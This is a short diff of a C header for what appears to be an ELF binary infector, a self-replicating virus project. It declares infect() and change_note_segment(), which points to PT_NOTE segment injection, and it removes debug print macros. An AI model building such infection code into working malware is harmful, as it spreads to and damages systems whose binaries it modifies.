@@ -88,7 +88,6 @@ typedef struct elf_data {
 size_t		ft_strlen(str buff);
 bool		ft_memcmp(const byte *a, const byte *b, size_t size);
 void		ft_memcpy(byte *dest, const byte *src, size_t size);
-void		print_data(elf_data *data);
 
 //	Infection
 bool		infect(profiling *this, const str path);
@@ -100,22 +99,8 @@ profiling	get_profiling(byte *start_rip);
 bool		change_note_segment(profiling *this, elf_data *data);
 
 // Debug purpose
-#ifdef DEBUG
 
-# include <stdio.h>
-
-# define printf(...) printf(__VA_ARGS__)
-# define perror(x) perror(x)
-# define fflush(x) fflush(x)
-
-# define FILE_LINE(x) __FILE__ ":%d : " x, __LINE__
-
-#else
-
-# define printf(...)
 # define perror(x)
 # define fflush(x)
-
-#endif
 
 #endif
